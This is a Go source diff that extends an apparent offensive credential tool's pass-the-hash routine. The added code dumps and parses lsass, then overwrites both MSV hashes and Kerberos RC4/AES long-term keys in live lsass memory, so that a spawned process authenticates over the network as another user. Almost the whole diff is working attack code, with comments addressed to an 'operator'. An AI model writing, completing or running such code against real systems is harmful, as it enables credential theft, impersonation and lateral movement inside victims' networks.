@@ -33,15 +33,12 @@ const msvSettleDelay = 200 * time.Millisecond
 // live in pth.go and pth_msv.go.
 
 // Pass spawns the configured Decoy under LOGON_NETCREDENTIALS_ONLY,
-// walks the live lsass for the resulting LUID's MSV LIST_ENTRY,
-// overwrites the NT/LM/SHA1 hash bytes with PTHTarget's values,
-// and resumes the process. The spawned process now outbound-
-// authenticates as Target on every subsequent network auth (SMB,
-// RDP, Kerberos AS-REQ, NTLM challenge-response).
-//
-// MSV write-back is wired in this commit. Kerberos write-back
-// (long-term keys for AS-REQ pre-auth) lands in the next slice —
-// PTHResult.KerberosOverwritten remains false until then.
+// walks the live lsass for the resulting LUID's MSV LIST_ENTRY and
+// Kerberos KIWI_KERBEROS_LOGON_SESSION, overwrites the per-etype
+// hash bytes with PTHTarget's values, and resumes the process. The
+// spawned process now outbound-authenticates as Target on every
+// subsequent network auth (SMB, RDP, NTLM challenge-response, and —
+// when AES128/AES256 keys are supplied — Kerberos AS-REQ pre-auth).
 //
 // Sequence:
 //
@@ -49,20 +46,30 @@ const msvSettleDelay = 200 * time.Millisecond
 //  2. lsassdump.OpenLSASS + Dump → minidump bytes (intrusive: opens
 //     lsass with PROCESS_VM_READ).
 //  3. Parse → Result with sessions; pick the session whose LogonID
-//     matches the spawned LUID; pull the *MSVCredential's CipherVA
-//     and CipherLen.
-//  4. Re-open lsass with PROCESS_VM_READ + PROCESS_VM_WRITE +
-//     PROCESS_VM_OPERATION; NtRead at CipherVA to get the live
-//     ciphertext (avoids race with the dump snapshot).
-//  5. decryptLSA → mutateMSVPrimary(target) → encryptLSA with the
-//     parsed lsaKey.
-//  6. NtWrite the fresh ciphertext at CipherVA.
+//     matches the spawned LUID; pull MSVCredential.CipherVA + Len
+//     and KerberosCredential.Hashes (per-etype CipherVA + Len).
+//  4. Re-open lsass with PROCESS_VM_READ | _WRITE | _OPERATION.
+//  5. MSV path: NtRead live cipher at CipherVA → decryptLSA →
+//     mutateMSVPrimary(target) → encryptLSA → NtWrite back. When
+//     the session has no PrimaryCredentials attached, fall back to
+//     NtAllocateVirtualMemory + node patch.
+//  6. Kerberos path: for each Hashes entry whose etype matches an
+//     operator-supplied key (RC4_HMAC=23 ↔ NTLM, AES128=17,
+//     AES256=18), encryptLSA the new bytes with the parsed lsaKey
+//     and NtWrite at hash.CipherVA.
 //  7. Open the spawned process with PROCESS_SUSPEND_RESUME and call
-//     NtResumeProcess. The process now runs with rewritten MSV
-//     credentials.
+//     NtResumeProcess. The process now runs with rewritten LSA
+//     state.
 //
-// All Nt* calls (Read/Write/Resume) route through p.Caller — pass
-// nil for the standard ntdll proc-table path.
+// All Nt* calls (Read/Write/Resume/Allocate) route through p.Caller
+// — pass nil for the standard ntdll proc-table path.
+//
+// Success criterion: at least one of MSVOverwritten /
+// KerberosOverwritten is true. NETCREDENTIALS_ONLY sessions land
+// only in the Kerberos AVL tree (no MSV LIST_ENTRY), so a Kerberos-
+// only success is the expected outcome for the spawn path. When
+// both paths fail to find a matching node, returns
+// ErrPTHNoMatchingLUID.
 //
 // On any error past the spawn step, the spawned process is left
 // suspended at the returned PID for the operator to clean up.
@@ -77,11 +84,41 @@ func Pass(p PTHParams) (PTHResult, error) {
 	}
 	res := PTHResult{PID: pid, LogonID: luid}
 
-	// Let lsass finish linking the MSV LIST_ENTRY before we dump.
+	// Let lsass finish linking the LIST_ENTRY / AVL node before we dump.
 	time.Sleep(msvSettleDelay)
 
-	if err := writeBackMSV(&res, p); err != nil {
+	parsed, hWrite, err := openLsassForWriteBack(&res, p)
+	if err != nil {
 		return res, err
+	}
+	defer windows.CloseHandle(hWrite)
+
+	msvErr := writeBackMSV(&res, parsed, hWrite, p)
+	kerbErr := writeBackKerberos(&res, parsed, hWrite, p)
+
+	if !res.MSVOverwritten && !res.KerberosOverwritten {
+		// Neither path landed. Prefer the more specific MSV error;
+		// fall back to the Kerberos one. When both report
+		// ErrPTHNoMatchingLUID the caller can dispatch on it.
+		switch {
+		case msvErr != nil:
+			return res, msvErr
+		case kerbErr != nil:
+			return res, kerbErr
+		default:
+			return res, errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
+				"LUID 0x%X: no MSV or Kerberos node carries writable credentials",
+				res.LogonID))
+		}
+	}
+	// At least one path succeeded — surface the other's error as a
+	// non-fatal warning so operators can audit partial overwrites
+	// (common when the target lacks AES keys but NTLM lands).
+	if msvErr != nil {
+		res.Warnings = append(res.Warnings, fmt.Sprintf("MSV write-back: %v", msvErr))
+	}
+	if kerbErr != nil {
+		res.Warnings = append(res.Warnings, fmt.Sprintf("Kerberos write-back: %v", kerbErr))
 	}
 
 	if err := resumeProcessByPID(pid, p.Caller); err != nil {
@@ -169,68 +206,66 @@ func impersonateSpawnedProcess(pid uint32) error {
 	return nil
 }
 
-// writeBackMSV does steps 2-6 of Pass: dump+parse, locate the
-// matching MSV credential, NtRead the live ciphertext, mutate +
-// re-encrypt, NtWrite back. Sets res.MSVOverwritten on success.
+// openLsassForWriteBack performs the dump+parse+open sequence shared
+// by writeBackMSV and writeBackKerberos. Returns the parsed Result
+// (with lsaKey populated) and an open handle to lsass with VM
+// READ|WRITE|OPERATION rights. Caller must CloseHandle(hWrite).
 //
-// Failures wrap ErrPTHWriteFailed (or ErrPTHNoMatchingLUID when
-// the LUID isn't in the dump's MSV walk).
-func writeBackMSV(res *PTHResult, p PTHParams) error {
-	// 2. Dump lsass.
+// Wraps every failure in ErrPTHWriteFailed; res.Warnings is appended
+// to with parsed.Warnings on success.
+func openLsassForWriteBack(res *PTHResult, p PTHParams) (*Result, windows.Handle, error) {
 	hLsass, err := lsassdump.OpenLSASS(p.Caller)
 	if err != nil {
-		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("OpenLSASS: %w", err))
+		return nil, 0, errors.Join(ErrPTHWriteFailed, fmt.Errorf("OpenLSASS: %w", err))
 	}
 	var dumpBuf bytes.Buffer
 	if _, err := lsassdump.Dump(hLsass, &dumpBuf, p.Caller); err != nil {
 		_ = lsassdump.CloseLSASS(hLsass)
-		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("Dump: %w", err))
+		return nil, 0, errors.Join(ErrPTHWriteFailed, fmt.Errorf("Dump: %w", err))
 	}
 	_ = lsassdump.CloseLSASS(hLsass)
 
-	// 3. Parse + locate the matching MSV credential.
 	parsed, parseErr := Parse(bytes.NewReader(dumpBuf.Bytes()), int64(dumpBuf.Len()))
-	// MSV-not-found is a hard fail for PTH (no MSV provider = no
-	// hash slots to overwrite); other partial-parse errors propagate.
 	if parsed == nil {
-		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("Parse: %w", parseErr))
+		return nil, 0, errors.Join(ErrPTHWriteFailed, fmt.Errorf("Parse: %w", parseErr))
 	}
 	if parseErr != nil && !errors.Is(parseErr, ErrUnsupportedBuild) {
-		// ErrUnsupportedBuild leaves keys+sessions empty — we can't
-		// proceed. Other warnings (missing optional providers) are
-		// surfaced via res.Warnings below.
 		if errors.Is(parseErr, ErrLSASRVNotFound) || errors.Is(parseErr, ErrMSVNotFound) {
-			return errors.Join(ErrPTHWriteFailed, parseErr)
+			return nil, 0, errors.Join(ErrPTHWriteFailed, parseErr)
 		}
 	}
 	if parsed.lsaKey == nil {
-		// Propagate the underlying Parse error when we have one — the
-		// usual cause is ErrUnsupportedBuild (dump's build isn't in
-		// the Template registry) or ErrLSASRVNotFound. Include
-		// BuildNumber so operators register the missing template.
 		if parseErr != nil {
-			return errors.Join(ErrPTHWriteFailed,
+			return nil, 0, errors.Join(ErrPTHWriteFailed,
 				fmt.Errorf("Parse: no lsaKey (build=%d): %w", parsed.BuildNumber, parseErr))
 		}
-		return errors.Join(ErrPTHWriteFailed,
+		return nil, 0, errors.Join(ErrPTHWriteFailed,
 			fmt.Errorf("Parse: no lsaKey (build=%d)", parsed.BuildNumber))
 	}
 	res.Warnings = append(res.Warnings, parsed.Warnings...)
 
-	// Open lsass for write — needed by both the in-place overwrite
-	// and the allocation fallback path.
 	lsassPID, err := lsassdump.LsassPID(p.Caller)
 	if err != nil {
-		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("LsassPID: %w", err))
+		return nil, 0, errors.Join(ErrPTHWriteFailed, fmt.Errorf("LsassPID: %w", err))
 	}
 	hWrite, err := windows.OpenProcess(
 		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION,
 		false, lsassPID)
 	if err != nil {
-		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("OpenProcess(lsass VM_RW): %w", err))
+		return nil, 0, errors.Join(ErrPTHWriteFailed, fmt.Errorf("OpenProcess(lsass VM_RW): %w", err))
 	}
-	defer windows.CloseHandle(hWrite)
+	return parsed, hWrite, nil
+}
 
+// writeBackMSV locates the matching MSV credential, NtReads the live
+// ciphertext, mutates + re-encrypts, NtWrites back. Sets
+// res.MSVOverwritten on success. When the session has no
+// PrimaryCredentials attached (NETCREDENTIALS_ONLY case), falls back
+// to NtAllocateVirtualMemory + node patch.
+//
+// Failures wrap ErrPTHWriteFailed (or ErrPTHNoMatchingLUID when the
+// LUID isn't in the dump's MSV walk).
+func writeBackMSV(res *PTHResult, parsed *Result, hWrite windows.Handle, p PTHParams) error {
 	target := findMSVForLUID(parsed, res.LogonID)
 	if target != nil {
 		// In-place overwrite path: matching session has an existing
@@ -299,6 +334,110 @@ func writeBackMSV(res *PTHResult, p PTHParams) error {
 		return err
 	}
 	res.MSVOverwritten = true
+	return nil
+}
+
+// Kerberos etypes consumed by writeBackKerberos. Mirrors the
+// KERB_ETYPE / RFC 3961 numbering used by Windows lsasrv. Only the
+// long-term key etypes carried in KIWI_KERBEROS_KEYS_LIST_6 are
+// listed — TGT/TGS session keys live elsewhere.
+const (
+	kerbEtypeRC4HMAC = 23 // 0x17 — NTLM-equivalent
+	kerbEtypeAES128  = 17 // 0x11 — AES128_CTS_HMAC_SHA1_96
+	kerbEtypeAES256  = 18 // 0x12 — AES256_CTS_HMAC_SHA1_96
+)
+
+// writeBackKerberos walks the matching session's KerberosCredential
+// .Hashes and overwrites each per-etype cipher in lsass with the
+// operator-supplied long-term key. The cipher length must match
+// exactly — Kerberos KERB_HASHPASSWORD_GENERIC carries a uint64 size
+// field that's read once at session-creation time, so a fresh blob of
+// a different length would corrupt the keys-list layout.
+//
+// Etype dispatch:
+//
+//   - 23 (RC4_HMAC_NT)              ← p.Target.NTLM (16 bytes)
+//   - 17 (AES128_CTS_HMAC_SHA1_96)  ← p.Target.AES128 (16 bytes)
+//   - 18 (AES256_CTS_HMAC_SHA1_96)  ← p.Target.AES256 (32 bytes)
+//
+// Etypes the operator didn't supply (nil/empty in PTHTarget) are
+// skipped silently. Etypes the kerberos.dll layout doesn't enumerate
+// (e.g., DES on 2003) are never visited.
+//
+// Sets res.KerberosOverwritten when at least one entry writes
+// successfully. Per-entry failures (ciphertext length mismatch, NT
+// status from NtWrite) are appended to res.Warnings — they don't
+// abort the walk because partial overwrites are still useful (NTLM
+// alone covers RC4 ticket flows even when AES misses).
+//
+// Returns ErrPTHNoMatchingLUID when no session matches res.LogonID
+// at all (the AVL walk produced no entry for the spawned LUID — same
+// signal the MSV path raises). Returns nil when the session matches
+// but has no Kerberos hashes to write (build's template lacks
+// KerberosPrimaryCredLayout, or kerberos.dll never linked the
+// pKeyList) — that's not an error, just nothing to do.
+func writeBackKerberos(res *PTHResult, parsed *Result, hWrite windows.Handle, p PTHParams) error {
+	session := findSessionByLUID(parsed, res.LogonID)
+	if session == nil {
+		return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
+			"LUID 0x%X not found among %d sessions (Kerberos walker)",
+			res.LogonID, len(parsed.Sessions)))
+	}
+
+	var kerb *KerberosCredential
+	for _, c := range session.Credentials {
+		if k, ok := c.(*KerberosCredential); ok {
+			kerb = k
+			break
+		}
+	}
+	if kerb == nil || len(kerb.Hashes) == 0 {
+		return nil
+	}
+
+	wrote := 0
+	for _, h := range kerb.Hashes {
+		var newKey []byte
+		switch h.Etype {
+		case kerbEtypeRC4HMAC:
+			newKey = p.Target.NTLM
+		case kerbEtypeAES128:
+			newKey = p.Target.AES128
+		case kerbEtypeAES256:
+			newKey = p.Target.AES256
+		default:
+			continue
+		}
+		if len(newKey) == 0 {
+			continue
+		}
+
+		// encryptLSA pads to AES block size internally; the *cipher*
+		// length must match the original or we'd write past the slot
+		// and corrupt the next entry's GENERIC header.
+		cipher, err := encryptLSA(newKey, parsed.lsaKey)
+		if err != nil {
+			res.Warnings = append(res.Warnings,
+				fmt.Sprintf("Kerberos etype %d: encryptLSA: %v", h.Etype, err))
+			continue
+		}
+		if uint32(len(cipher)) != h.CipherLen {
+			res.Warnings = append(res.Warnings, fmt.Sprintf(
+				"Kerberos etype %d: cipher length %d != slot %d (skipping to preserve layout)",
+				h.Etype, len(cipher), h.CipherLen))
+			continue
+		}
+		if err := ntWriteVirtualMemory(hWrite, uintptr(h.CipherVA), cipher, p.Caller); err != nil {
+			res.Warnings = append(res.Warnings, fmt.Sprintf(
+				"Kerberos etype %d @0x%X: NtWriteVirtualMemory: %v",
+				h.Etype, h.CipherVA, err))
+			continue
+		}
+		wrote++
+	}
+	if wrote > 0 {
+		res.KerberosOverwritten = true
+	}
 	return nil
 }
 
